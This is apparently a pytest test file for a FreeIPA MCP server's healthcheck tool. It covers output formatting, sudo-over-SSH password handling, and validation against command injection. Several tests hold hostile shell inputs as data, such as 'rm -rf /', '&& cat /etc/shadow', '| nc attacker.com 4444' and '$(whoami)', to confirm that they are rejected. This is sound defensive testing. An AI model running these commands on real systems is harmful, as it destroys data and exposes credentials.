# SPDX-License-Identifier: GPL-3.0-or-later
import json
from unittest.mock import MagicMock, patch

import pytest

SAMPLE_HEALTHCHECK_JSON = json.dumps(
    [
        {
            "source": "ipahealthcheck.ipa.certs",
            "check": "IPADogtagCertsMatchCheck",
            "result": "SUCCESS",
            "uuid": "abc",
            "kw": {},
        },
        {
            "source": "ipahealthcheck.ipa.certs",
            "check": "IPACertExpiration",
            "result": "ERROR",
            "uuid": "def",
            "kw": {"key": "caSigningCert", "days": 30},
        },
    ]
)


def test_get_kerberos_principal_parses_klist():
    from freeipa_mcp.tools.healthcheck import _get_kerberos_principal

    mock_result = MagicMock()
    mock_result.returncode = 0
    mock_result.stdout = (
        "Ticket cache: FILE:/tmp/krb5cc_1000\n"
        "Default principal: admin@EXAMPLE.COM\n\n"
        "Valid starting     Expires            Service principal\n"
    )
    with patch("subprocess.run", return_value=mock_result):
        assert _get_kerberos_principal() == "admin"


def test_get_kerberos_principal_no_ticket_raises():
    from freeipa_mcp.tools.healthcheck import _get_kerberos_principal

    mock_result = MagicMock()
    mock_result.returncode = 1
    with patch("subprocess.run", return_value=mock_result):
        with pytest.raises(RuntimeError, match="No Kerberos ticket"):
            _get_kerberos_principal()


def test_format_as_markdown_sections_and_counts():
    from freeipa_mcp.tools.healthcheck import _format_as_markdown

    md = _format_as_markdown(SAMPLE_HEALTHCHECK_JSON)
    assert "# IPA Healthcheck Results" in md
    assert "## Summary" in md
    assert "Total Checks:** 2" in md
    assert "Errors:** 1" in md
    assert "Success:** 1" in md
    assert "## ERROR Results" in md
    assert "## SUCCESS Results" in md
    assert "ipahealthcheck.ipa.certs - IPACertExpiration" in md
    assert "## Recommendations" in md


def test_format_as_markdown_kw_snake_to_title():
    from freeipa_mcp.tools.healthcheck import _format_as_markdown

    data = json.dumps(
        [
            {
                "source": "src",
                "check": "chk",
                "result": "ERROR",
                "kw": {"msg": "bad cert", "expiration_date": "2025-01-01", "ca": "ipa"},
            }
        ]
    )
    md = _format_as_markdown(data)
    assert "**Message:**" in md
    assert "**Expiration Date:**" in md
    assert "**CA:**" in md


def test_format_as_markdown_empty_returns_no_results():
    from freeipa_mcp.tools.healthcheck import _format_as_markdown

    md = _format_as_markdown("[]")
    assert "No healthcheck results found" in md


def test_format_as_markdown_all_success_no_recommendations():
    from freeipa_mcp.tools.healthcheck import _format_as_markdown

    data = json.dumps(
        [
            {"source": "s", "check": "c", "result": "SUCCESS", "kw": {}},
        ]
    )
    md = _format_as_markdown(data)
    assert "All checks passed" in md
    assert "Recommendations" not in md


def test_format_as_markdown_invalid_json_returns_raw():
    from freeipa_mcp.tools.healthcheck import _format_as_markdown

    assert _format_as_markdown("not json") == "not json"


def test_snake_to_title():
    from freeipa_mcp.tools.healthcheck import _snake_to_title

    assert _snake_to_title("config_file") == "Config File"
    assert _snake_to_title("expiration_date") == "Expiration Date"
    assert _snake_to_title("msg") == "Message"
    assert _snake_to_title("ca") == "CA"
    assert _snake_to_title("ocsp_signing_cert") == "Ocsp Signing Cert"


async def test_execute_passwordless_skips_gui():
    principal_path = "freeipa_mcp.tools.healthcheck._get_kerberos_principal"
    cache_path = "freeipa_mcp.tools.healthcheck._get_cached_sources"
    ssh_path = "freeipa_mcp.tools.healthcheck._exec_ssh"
    gui_path = "freeipa_mcp.tools.sudo_gui.get_sudo_password"
    with (
        patch(principal_path, return_value="admin"),
        patch(cache_path, return_value={}),
        patch(ssh_path, return_value=SAMPLE_HEALTHCHECK_JSON),
        patch(gui_path) as mock_gui,
    ):
        from freeipa_mcp.tools.healthcheck import execute

        result = await execute(
            server_hostname="ipa.example.com", mode="live", passwordless=True
        )
    mock_gui.assert_not_called()
    assert "Healthcheck" in result or "ERROR" in result


async def test_execute_non_passwordless_shows_gui():
    principal_path = "freeipa_mcp.tools.healthcheck._get_kerberos_principal"
    cache_path = "freeipa_mcp.tools.healthcheck._get_cached_sources"
    ssh_path = "freeipa_mcp.tools.healthcheck._exec_ssh"
    gui_path = "freeipa_mcp.tools.sudo_gui.get_sudo_password"
    with (
        patch(principal_path, return_value="admin"),
        patch(cache_path, return_value={}),
        patch(ssh_path, return_value=SAMPLE_HEALTHCHECK_JSON),
        patch(gui_path, return_value="s3cr3t") as mock_gui,
    ):
        from freeipa_mcp.tools.healthcheck import execute

        result = await execute(
            server_hostname="ipa.example.com", mode="live", passwordless=False
        )
    mock_gui.assert_called_once_with("admin", "ipa.example.com")
    assert "Healthcheck" in result or "ERROR" in result


async def test_execute_gui_cancel_raises():
    principal_path = "freeipa_mcp.tools.healthcheck._get_kerberos_principal"
    gui_path = "freeipa_mcp.tools.sudo_gui.get_sudo_password"
    with (
        patch(principal_path, return_value="admin"),
        patch(gui_path, side_effect=RuntimeError("Sudo authentication cancelled")),
    ):
        from freeipa_mcp.tools.healthcheck import execute

        with pytest.raises(RuntimeError, match="cancelled"):
            await execute(server_hostname="ipa.example.com", passwordless=False)


async def test_exec_ssh_uses_sudo_with_password():
    from freeipa_mcp.tools.healthcheck import _exec_ssh

    mock_result = MagicMock()
    mock_result.returncode = 0
    mock_result.stdout = "output line\n0\n"
    mock_result.stderr = ""
    with patch("subprocess.run", return_value=mock_result) as mock_run:
        _exec_ssh("host", "user", "ipa-healthcheck", password="secret")  # noqa: S106 - test data
    call_args = mock_run.call_args[0][0]
    call_kwargs = mock_run.call_args[1]
    remote_cmd = call_args[-1]
    assert "sudo --stdin" in remote_cmd
    # SECURITY: Password should be passed via input parameter, not embedded in command
    assert "secret" not in remote_cmd
    assert call_kwargs["input"] == "secret\n"


async def test_exec_ssh_prevents_command_injection_via_password():
    """Test that special characters in password don't cause command injection."""
    from freeipa_mcp.tools.healthcheck import _exec_ssh

    # Test passwords with various injection attempts
    dangerous_passwords = [
        'hello"; rm -rf / #',  # Double quote injection
        "test$(whoami)test",  # Command substitution
        "test`id`test",  # Backtick command substitution
        "test\nrm -rf /\n",  # Newline injection
        "test;echo hacked;",  # Semicolon command separator
    ]

    for password in dangerous_passwords:
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "output line\n0\n"
        mock_result.stderr = ""

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            _exec_ssh("host", "user", "ipa-healthcheck", password=password)

        call_kwargs = mock_run.call_args[1]
        remote_cmd = mock_run.call_args[0][0][-1]

        # Password should NOT be in the remote command
        assert password not in remote_cmd, f"Password leaked into command: {password}"
        # Password SHOULD be in the input parameter
        assert call_kwargs["input"] == f"{password}\n"
        # Remote command should not contain injection attempts
        assert "rm" not in remote_cmd
        assert "whoami" not in remote_cmd
        assert "echo hacked" not in remote_cmd


async def test_exec_ssh_uses_sudo_without_password():
    from freeipa_mcp.tools.healthcheck import _exec_ssh

    mock_result = MagicMock()
    mock_result.returncode = 0
    mock_result.stdout = "output line\n0\n"
    mock_result.stderr = ""
    with patch("subprocess.run", return_value=mock_result) as mock_run:
        _exec_ssh("host", "user", "ipa-healthcheck", password=None)
    call_args = mock_run.call_args[0][0]
    remote_cmd = call_args[-1]
    assert "sudo --stdin" not in remote_cmd
    assert "sudo" in remote_cmd


# ============================================================================
# Security Tests: C-1 Command Injection Prevention
# ============================================================================


def test_validate_source_accepts_valid_source():
    """SECURITY: Source validation should accept valid cached sources."""
    from freeipa_mcp.tools.healthcheck import _validate_source

    # Mock cached sources
    cached_sources = {
        "ipahealthcheck.ipa.certs": ["IPACertExpiration", "IPACertTracking"],
        "ipahealthcheck.meta.services": ["service.httpd", "service.pki_tomcatd"],
    }

    # Should not raise for valid source
    _validate_source("ipahealthcheck.ipa.certs", cached_sources)


def test_validate_source_rejects_invalid_source():
    """SECURITY: Source validation should reject sources not in cache."""
    from freeipa_mcp.tools.healthcheck import _validate_source

    cached_sources = {
        "ipahealthcheck.ipa.certs": ["IPACertExpiration"],
    }

    # Should raise ValueError for invalid source
    with pytest.raises(ValueError, match="Invalid source"):
        _validate_source("malicious.source; rm -rf /", cached_sources)


def test_validate_source_rejects_shell_metacharacters():
    """SECURITY: Source validation must reject shell metacharacters."""
    from freeipa_mcp.tools.healthcheck import _validate_source

    cached_sources = {"valid.source": ["check1"]}

    # Test various injection attempts
    injection_attempts = [
        "source; rm -rf /",
        "source && cat /etc/shadow",
        "source | nc attacker.com 4444",
        "source `whoami`",
        "source $(reboot)",
        "source > /etc/passwd",
        "source < /dev/null",
    ]

    for attempt in injection_attempts:
        with pytest.raises(ValueError, match="Invalid source"):
            _validate_source(attempt, cached_sources)


def test_validate_check_accepts_valid_check():
    """SECURITY: Check validation should accept valid cached checks for source."""
    from freeipa_mcp.tools.healthcheck import _validate_check

    cached_sources = {
        "ipahealthcheck.ipa.certs": ["IPACertExpiration", "IPACertTracking"],
    }

    # Should not raise for valid check
    _validate_check("ipahealthcheck.ipa.certs", "IPACertExpiration", cached_sources)


def test_validate_check_rejects_invalid_check():
    """SECURITY: Check validation should reject checks not in cache for source."""
    from freeipa_mcp.tools.healthcheck import _validate_check

    cached_sources = {
        "ipahealthcheck.ipa.certs": ["IPACertExpiration"],
    }

    # Should raise ValueError for invalid check
    with pytest.raises(ValueError, match="Invalid check"):
        _validate_check(
            "ipahealthcheck.ipa.certs", "MaliciousCheck; echo pwned", cached_sources
        )


def test_validate_check_requires_source():
    """SECURITY: Check validation should reject check without source."""
    from freeipa_mcp.tools.healthcheck import _validate_check

    cached_sources = {"source": ["check1"]}

    # Should raise ValueError when source is None
    with pytest.raises(ValueError, match="Check parameter requires a source"):
        _validate_check(None, "check1", cached_sources)


def test_validate_severity_accepts_valid_values():
    """SECURITY: Severity validation accepts SUCCESS, WARNING, ERROR, CRITICAL."""
    from freeipa_mcp.tools.healthcheck import _validate_severity

    # Should not raise for valid severity values
    _validate_severity(["SUCCESS"])
    _validate_severity(["WARNING"])
    _validate_severity(["ERROR"])
    _validate_severity(["CRITICAL"])
    _validate_severity(["SUCCESS", "ERROR", "CRITICAL"])


def test_validate_severity_rejects_invalid_values():
    """SECURITY: Severity validation should reject any value not in allowed list."""
    from freeipa_mcp.tools.healthcheck import _validate_severity

    # Should raise ValueError for invalid severity
    invalid_severities = [
        ["INVALID"],
        ["success"],  # lowercase
        ["ERROR; echo pwned"],
        ["WARNING", "malicious"],
    ]

    for invalid in invalid_severities:
        with pytest.raises(ValueError, match="Invalid severity"):
            _validate_severity(invalid)


async def test_execute_validates_parameters_before_ssh():
    """SECURITY: execute() must validate all parameters before calling SSH."""
    from freeipa_mcp.tools.healthcheck import execute

    principal_path = "freeipa_mcp.tools.healthcheck._get_kerberos_principal"
    cache_path = "freeipa_mcp.tools.healthcheck._get_cached_sources"
    ssh_path = "freeipa_mcp.tools.healthcheck._exec_ssh"

    cached_sources = {
        "ipahealthcheck.ipa.certs": ["IPACertExpiration"],
    }

    with (
        patch(principal_path, return_value="admin"),
        patch(cache_path, return_value=cached_sources),
        patch(ssh_path) as mock_ssh,
    ):
        # Invalid source should raise before SSH is called
        with pytest.raises(ValueError, match="Invalid source"):
            await execute(
                server_hostname="ipa.example.com",
                source="malicious; rm -rf /",
                passwordless=True,
            )

        # SSH should never have been called
        mock_ssh.assert_not_called()


async def test_execute_failures_only_defaults_to_true():
    """failures_only defaults to True to minimize data traffic and token count."""
    from freeipa_mcp.tools.healthcheck import execute

    principal_path = "freeipa_mcp.tools.healthcheck._get_kerberos_principal"
    cache_path = "freeipa_mcp.tools.healthcheck._get_cached_sources"
    ssh_path = "freeipa_mcp.tools.healthcheck._exec_ssh"

    with (
        patch(principal_path, return_value="admin"),
        patch(cache_path, return_value={}),
        patch(ssh_path, return_value="[]") as mock_ssh,
    ):
        await execute(server_hostname="ipa.example.com", passwordless=True)

        # Check that --failures-only was included in command
        call_args = mock_ssh.call_args[0][2]  # command argument
        assert "--failures-only" in call_args


def test_parse_list_sources_output():
    """Parse ipa-healthcheck --list-sources output into cache structure."""
    from freeipa_mcp.tools.healthcheck import _parse_list_sources

    output = """ipahealthcheck.ipa.certs
  IPACertExpiration
  IPACertTracking
ipahealthcheck.meta.services
  service.httpd
  service.pki_tomcatd
ipahealthcheck.ipa.dna
  IPADNARangeCheck"""

    expected = {
        "ipahealthcheck.ipa.certs": ["IPACertExpiration", "IPACertTracking"],
        "ipahealthcheck.meta.services": ["service.httpd", "service.pki_tomcatd"],
        "ipahealthcheck.ipa.dna": ["IPADNARangeCheck"],
    }

    result = _parse_list_sources(output)
    assert result == expected


def test_parse_list_sources_empty():
    """Parse empty output should return empty dict."""
    from freeipa_mcp.tools.healthcheck import _parse_list_sources

    assert _parse_list_sources("") == {}
    assert _parse_list_sources("\n\n") == {}


# ============================================================================
# Security Tests: Additional Hardening
# ============================================================================


def test_parse_list_sources_rejects_shell_metacharacters_in_source():
    """SECURITY: Parser must reject source names with shell metacharacters."""
    from freeipa_mcp.tools.healthcheck import _parse_list_sources

    malicious_output = """malicious.source; rm -rf /
  CheckName1
ipahealthcheck.ipa.certs
  IPACertExpiration"""

    with pytest.raises(ValueError, match="Invalid source name format"):
        _parse_list_sources(malicious_output)


def test_parse_list_sources_rejects_shell_metacharacters_in_check():
    """SECURITY: Parser must reject check names with shell metacharacters."""
    from freeipa_mcp.tools.healthcheck import _parse_list_sources

    malicious_output = """ipahealthcheck.ipa.certs
  MaliciousCheck; echo pwned
  IPACertExpiration"""

    with pytest.raises(ValueError, match="Invalid check name format"):
        _parse_list_sources(malicious_output)


def test_parse_list_sources_accepts_valid_format():
    """Parser accepts alphanumeric, dots, hyphens, underscores."""
    from freeipa_mcp.tools.healthcheck import _parse_list_sources

    valid_output = """ipahealthcheck.ipa.certs
  IPACertExpiration
  IPACert_Tracking-Check
ipahealthcheck.meta.services
  service.httpd"""

    result = _parse_list_sources(valid_output)
    assert "ipahealthcheck.ipa.certs" in result
    assert "IPACert_Tracking-Check" in result["ipahealthcheck.ipa.certs"]


def test_validate_cached_sources_rejects_poisoned_cache():
    """SECURITY: Validate cached data rejects shell metacharacters."""
    from freeipa_mcp.tools.healthcheck import _validate_cached_sources

    poisoned_cache = {
        "valid.source": ["ValidCheck"],
        "malicious; rm -rf /": ["BadCheck"],
    }

    with pytest.raises(ValueError, match="Invalid source name in cache"):
        _validate_cached_sources(poisoned_cache)


def test_validate_cached_sources_rejects_poisoned_checks():
    """SECURITY: Validate cached data rejects metacharacters in checks."""
    from freeipa_mcp.tools.healthcheck import _validate_cached_sources

    poisoned_cache = {
        "valid.source": ["ValidCheck", "Bad; echo pwned"],
    }

    with pytest.raises(ValueError, match="Invalid check name in cache"):
        _validate_cached_sources(poisoned_cache)


def test_validate_cached_sources_accepts_valid_cache():
    """Validate cached data accepts properly formatted cache."""
    from freeipa_mcp.tools.healthcheck import _validate_cached_sources

    valid_cache = {
        "ipahealthcheck.ipa.certs": ["IPACertExpiration", "IPACert_Tracking"],
        "ipahealthcheck.meta.services": ["service.httpd"],
    }

    # Should not raise
    _validate_cached_sources(valid_cache)


async def test_execute_validates_server_hostname():
    """SECURITY: execute() must validate server_hostname with validate_fqdn."""
    from freeipa_mcp.tools.healthcheck import execute

    # Test path traversal attempt
    with pytest.raises(ValueError, match="(Invalid hostname|Hostname must have)"):
        await execute(server_hostname="../../etc", passwordless=True)

    # Test invalid hostname (shell metacharacters)
    with pytest.raises(ValueError, match="(Invalid hostname|Hostname must have)"):
        await execute(server_hostname="malicious; rm -rf /", passwordless=True)


def test_get_cached_sources_respects_ttl():
    """SECURITY: Cache should refresh after TTL expires."""
    import time
    from unittest.mock import MagicMock, patch

    from freeipa_mcp.tools.healthcheck import _get_cached_sources

    cache_path = "freeipa_mcp.tools.healthcheck._get_cache_dir"
    ssh_path = "freeipa_mcp.tools.healthcheck._exec_ssh"

    # Create a mock cache file with old mtime (25 hours ago)
    old_mtime = time.time() - (25 * 60 * 60)
    mock_cache_file = MagicMock()
    mock_cache_file.exists.return_value = True
    mock_cache_file.stat.return_value.st_mtime = old_mtime
    mock_cache_file.read_text.return_value = '{"old.source": ["OldCheck"]}'

    mock_cache_dir = MagicMock()
    mock_cache_dir.__truediv__.return_value = mock_cache_file

    new_sources_output = "new.source\n  NewCheck"

    with (
        patch(cache_path, return_value=mock_cache_dir),
        patch(ssh_path, return_value=new_sources_output) as mock_ssh,
    ):
        result = _get_cached_sources("ipa.example.com", "admin", None)

    # Should have called SSH to refresh stale cache
    mock_ssh.assert_called_once()
    assert "new.source" in result
    assert "old.source" not in result


def test_allowed_severities_is_module_constant():
    """_ALLOWED_SEVERITIES should be a module-level constant."""
    from freeipa_mcp.tools import healthcheck

    assert hasattr(healthcheck, "_ALLOWED_SEVERITIES")
    assert isinstance(healthcheck._ALLOWED_SEVERITIES, frozenset)
    assert healthcheck._ALLOWED_SEVERITIES == frozenset(
        ["SUCCESS", "WARNING", "ERROR", "CRITICAL"]
    )
